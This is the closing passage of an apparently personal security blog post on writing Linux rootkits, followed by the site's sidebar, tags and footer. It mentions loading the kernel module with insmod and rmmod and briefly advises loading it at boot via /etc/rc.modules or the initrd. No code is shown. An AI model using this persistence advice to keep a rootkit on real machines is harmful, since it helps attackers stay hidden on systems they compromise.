<p>after building the LKM, <code>insmod</code> helps you load the module, <code>rmmod</code> does the opposite</p>
<p>lets load it and see:</p>
<p><img alt="lkm run" src="/img/lkm_run.png"/></p>
<h3 id="no-one-seems-to-care-about-initrd">no one seems to care about initrd</h3>
<p>you can write LKM to <code>/etc/rc.modules</code> or something to load your LKM on boot, but theres a better way to do that</p>
<p>yes initrd helps a lot</p>
<p>if you dont understand the way linux boots itself, go to <a href="https://wiki.debian.org/initramfs">this article</a></p>
<p>for Kali Rolling (Linux 4.18), we have the following demo:</p>
<p><img alt="initrd" src="/img/initrd.png"/></p>
<h2 id="thats-it-thank-you-guys-for-being-here-if-you-need-heres-the-chinese-version">thats it, thank you guys for being here. if you need, <a href="https://www.freebuf.com/column/188100.html">heres the Chinese version</a></h2>
        </div>
        <!-- /.entry-content -->
    <hr/>
    <section class="comments" id="comments">
        <h2>Comments</h2>

        <div id="disqus_thread"></div>
        <script type="text/javascript">
            /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
            var disqus_shortname = 'jm33-m0'; // required: replace example with your forum shortname

            var disqus_config = function () {
                this.language = "en";

                        this.page.url = 'https://jm33.me/write-better-linux-rootkits.html';
            };

            /* * * DON'T EDIT BELOW THIS LINE * * */
            (function () {
                var dsq = document.createElement('script');
                dsq.type = 'text/javascript';
                dsq.async = true;
                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
            Disqus.</a></noscript>
        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

    </section>
    </article>
</section>

            </div>
            <div class="col-sm-3" id="sidebar">
                <aside>
<div id="aboutme">
    <p>
        <img width="100%" class="img-thumbnail" src="https://jm33.me//img/profile.webp" />
    </p>
     <p>
        <strong>About jm33</strong><br />
        
<h3>Who</h3>
<ul>
<li>
    <p><strong><a href="/pages/jing-mi.html" target="_blank">Cyber Security Researcher</a></strong></p>
</li>
</ul>
<h3>Contact</h3>
<ul>
<li>
    <p><strong><a href="/pages/gpg.html" target="_blank" title="My GPG public key, I'm sure you can find my email addresses in it">0x3A5DBF07</a></strong></p>
</li>
<li>
    <p><strong><a rel="me" href="https://infosec.exchange/@jm33">Mastodon</a></strong></p>
</li>
<li>
    <p><strong><a href="https://jm33.me/pages/got-something-to-say.html" target="_blank">Leave a message</a></strong></p>
</li>
</ul>

    </p>
</div><!-- Sidebar -->
<section class="well well-sm">
    <ul class="list-group list-group-flush">

<!-- Sidebar/Social -->
<li class="list-group-item">
  <h4><i class="fa fa-home fa-lg"></i><span class="icon-label">Social</span></h4>
  <ul class="list-group" id="social">
    <li class="list-group-item"><a href="https://twitter.com/jm33_m0"><i class="fa fa-twitter-square fa-lg"></i> Twitter</a></li>
    <li class="list-group-item"><a href="https://github.com/jm33-m0"><i class="fa fa-github-square fa-lg"></i> GitHub</a></li>
    <li class="list-group-item"><a href="https://www.linkedin.com/in/jm33m0"><i class="fa fa-linkedin-square fa-lg"></i> LinkedIn</a></li>
    <li class="list-group-item"><a href="https://stackoverflow.com/users/5230333/jm33-m0"><i class="fa fa-stack-overflow fa-lg"></i> StackOverflow</a></li>
  </ul>
</li>
<!-- End Sidebar/Social -->

<!-- Sidebar/Recent Posts -->
<li class="list-group-item">
  <h4><i class="fa fa-home fa-lg"></i><span class="icon-label">Recent Posts</span></h4>
  <ul class="list-group" id="recentposts">
    <li class="list-group-item"><a href="https://jm33.me/my-2024.html">My 2024</a></li>
    <li class="list-group-item"><a href="https://jm33.me/reversing-a-go-malware-using-ghidra.html">Reversing a Go Malware Using Ghidra</a></li>
    <li class="list-group-item"><a href="https://jm33.me/secure-boot-in-arch-linux.html">Secure Boot in Arch Linux</a></li>
    <li class="list-group-item"><a href="https://jm33.me/openssh-server-mi-ma-shou-ge-ji.html">OpenSSH Server 密码收割机</a></li>
    <li class="list-group-item"><a href="https://jm33.me/migrating-from-libvirt-to-qemu.html">Migrating from Libvirt to Qemu</a></li>
  </ul>
</li>
<!-- End Sidebar/Recent Posts -->

<!-- Sidebar/Tag Cloud -->
<li class="list-group-item">
  <a href="https://jm33.me/tags.html"><h4><i class="fa fa-tags fa-lg"></i><span class="icon-label">Tags</span></h4></a>
  <ul class="list-group list-inline tagcloud" id="tags">
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/2024.html">2024</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/404.html">404</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/443.html">443</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/active-directory.html">active directory</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/ad.html">ad</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/announcement.html">announcement</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/antivirus.html">antivirus</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/anyconnect.html">anyconnect</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/apache.html">apache</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/arch.html">arch</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/assembly.html">assembly</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/asu.html">asu</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/backdoor.html">backdoor</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/baidu.html">baidu</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/blackhat.html">blackhat</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/bridge.html">bridge</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/buffer-overflow.html">buffer overflow</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/c.html">C#</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/career.html">career</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/censorship.html">censorship</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/cisco.html">cisco</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/code-maintainance.html">code maintainance</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/compton.html">compton</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/conhost.html">conhost</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/conpty.html">conpty</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/coursera.html">Coursera</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/credential-harvesting.html">credential harvesting</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/crypto.html">crypto</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/cryptography.html">cryptography</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/cve.html">CVE</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/cve-2018-18955.html">CVE-2018-18955</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/cve-2018-7750.html">CVE-2018-7750</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/diary.html">diary</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/dnswu-ran.html">DNS污染</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/dpi.html">DPI</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/email.html">email</a>
    </li>
    <li class="list-group-item tag-1">
      <a href="https://jm33.me/tag/emp3r0r.html">emp3r0r</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/exploit.html">exploit</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/file-transfer.html">file transfer</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/gdb.html">gdb</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/gfw.html">gfw</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/ghidra.html">ghidra</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/github.html">github</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/glowing-bear.html">Glowing Bear</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/golang.html">golang</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/gpu.html">gpu</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/great-wall.html">great wall</a>
    </li>
    <li class="list-group-item tag-1">
      <a href="https://jm33.me/tag/greatwall.html">greatwall</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/hacking.html">hacking</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/hacking-tool.html">hacking tool</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/hiwifi.html">HiWiFi</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/http2.html">HTTP2</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/https.html">https</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/injection.html">injection</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/irc.html">IRC</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/ji-lu-you.html">极路由</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/kcp.html">KCP</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/kcptun.html">kcptun</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/kernel.html">kernel</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/killer.html">killer</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/lede.html">lede</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/libvirt.html">libvirt</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/life.html">life</a>
    </li>
    <li class="list-group-item tag-1">
      <a href="https://jm33.me/tag/linux.html">linux</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/linux-kernel.html">linux kernel</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/lkm.html">lkm</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/log-cleaner.html">log cleaner</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/lpe.html">LPE</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/macos.html">macos</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/mass-exploit.html">mass exploit</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/mec.html">mec</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/memory-layout.html">memory layout</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/mentohust.html">mentohust</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/misc.html">Misc</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/mouse.html">mouse</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/multi-threaded-crawler.html">multi-threaded crawler</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/namespace.html">namespace</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/natural-scroll.html">natural scroll</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/netcat.html">netcat</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/network.html">network</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/nic.html">nic</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/obfs4.html">obfs4</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/obfsproxy.html">obfsproxy</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/ocserv.html">ocserv</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/openwrt.html">openwrt</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/paramiko.html">paramiko</a>
    </li>
    <li class="list-group-item tag-1">
      <a href="https://jm33.me/tag/pentest.html">pentest</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/pep8.html">pep8</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/pgp.html">PGP</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/pi.html">pi</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/port-forwarding.html">port-forwarding</a>
    </li>
    <li class="list-group-item tag-1">
      <a href="https://jm33.me/tag/post-exploitation.html">post-exploitation</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/privilege-escalation.html">privilege escalation</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/programming.html">programming</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/project.html">project</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/proxy.html">proxy</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/ptrace.html">ptrace</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/ptrace_traceme.html">PTRACE_TRACEME</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/python.html">python</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/pythonic.html">pythonic</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/qemu.html">qemu</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/qq.html">QQ</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/quote.html">quote</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/rce.html">RCE</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/reverse-shell.html">reverse shell</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/reversing.html">reversing</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/rootkit.html">rootkit</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/s2-045.html">s2-045</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/scanner.html">scanner</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/scramblesuit.html">scramblesuit</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/secure-boot.html">secure boot</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/seed-lab.html">SEED lab</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/sfu.html">sfu</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/shadowsocks.html">shadowsocks</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/shadowsocks-plus.html">shadowsocks-plus</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/shell.html">shell</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/shellcode.html">shellcode</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/socket.html">socket</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/ss.html">SS</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/ssh.html">ssh</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/ssh-harvester.html">ssh-harvester</a>
    </li>
    <li class="list-group-item tag-3">
      <a href="https://jm33.me/tag/sshd.html">sshd</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/ssl.html">SSL</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/stanford.html">Stanford</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/sudo.html">sudo</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/switch.html">switch</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/systemd.html">systemd</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/terminal.html">terminal</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/thomas-jefferson.html">Thomas Jefferson</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/tmux.html">TMUX</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/tools.html">tools</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/trasparent-proxy.html">trasparent proxy</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/vim.html">vim</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/virtualbox.html">virtualbox</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/virtualization.html">virtualization</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/vpn.html">vpn</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/wayland.html">wayland</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/web.html">web</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/weechat.html">weechat</a>
    </li>
    <li class="list-group-item tag-2">
      <a href="https://jm33.me/tag/windows.html">windows</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/windows-domain.html">windows domain</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/windows-server.html">windows server</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/xfce4.html">xfce4</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/xfwm.html">xfwm</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/xhost.html">xhost</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/xml.html">xml</a>
    </li>
    <li class="list-group-item tag-4">
      <a href="https://jm33.me/tag/zoomeye.html">zoomeye</a>
    </li>
  </ul>
</li>
<!-- End Sidebar/Tag Cloud -->
    </ul>
</section>
<!-- End Sidebar -->                </aside>
            </div>
        </div>
    </div>
    <!-- End Content Container -->

<footer>
    <div class="container">
        <hr />
        <div class="row">
                <div class="col-xs-10">
                &copy; 2024 jm33-ng -
                <a href="/pages/about.html" target="_blank" title="about this site">
                    About this site</a>                <p>
                    <small><a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.en"><img alt="Creative Commons License" style="border-width:0" src="//i.creativecommons.org/l/by-nc/4.0/80x15.png" /></a>
Content
licensed under a <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.en">Creative Commons Attribution-NonCommercial 4.0 International License</a>, except where indicated otherwise.
</small>
                </p>
                <p>
                    <small>Images hosted on this site are either my own or from the Internet</small>
                </p>
            </div>
        </div>
    </div>
</footer>
    <script src="https://jm33.me/theme/js/jquery.min.js"></script>

    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://jm33.me/theme/js/bootstrap.min.js"></script>

    <!-- Enable responsive features in IE8 with Respond.js (https://github.com/scottjehl/Respond) -->
    <script src="https://jm33.me/theme/js/respond.min.js"></script>


    <script src="https://jm33.me/theme/js/bodypadding.js"></script>
<!-- Disqus -->
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'jm33-m0'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var s = document.createElement('script');
        s.async = true;
        s.type = 'text/javascript';
        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>
<!-- End Disqus Code -->
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-83DRXDJQYG"></script>
<script>
    window.dataLayer = window.dataLayer || [];

    function gtag() {
        dataLayer.push(arguments);
    }
    gtag('js', new Date());

    gtag('config', 'G-83DRXDJQYG');
</script>



    <!-- custom part  -->

    <!-- asciinema js -->
    <script src="https://jm33.me/theme/js/asciinema-player.js" async></script>

    <!-- back-to-top starts -->
    <style>
        #topBtn {
            display: none;
            position: fixed;
            bottom: 20px;
            right: 30px;
            z-index: 99;
            border: none;
            outline: none;
            background-color: rgba(62, 63, 58, 0.9);
            color: white;
            cursor: pointer;
            padding: 10px;
            border-radius: 200px;
            font-size: 40px;
            line-height: 40px;
        }

        #topBtn:hover {
            background-color: #3e3f3a;
        }
    </style>

    <button onclick="topFunction()" id="topBtn" title="Go to top"><i class="fa fa-arrow-up" aria-hidden="true"></i></button>

    <script>
        // When the user scrolls down 20px from the top of the document, show the button
        window.onscroll = function() {
            scrollFunction()
        };

        function scrollFunction() {
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                document.getElementById("topBtn").style.display = "block";

            } else {
                document.getElementById("topBtn").style.display = "none";

            }

        }

        // When the user clicks on the button, scroll to the top of the document
        function topFunction() {
            document.body.scrollTop = 0;
            document.documentElement.scrollTop = 0;

        }
    </script>
    <!-- back-to-top ends-->

</body>

</html>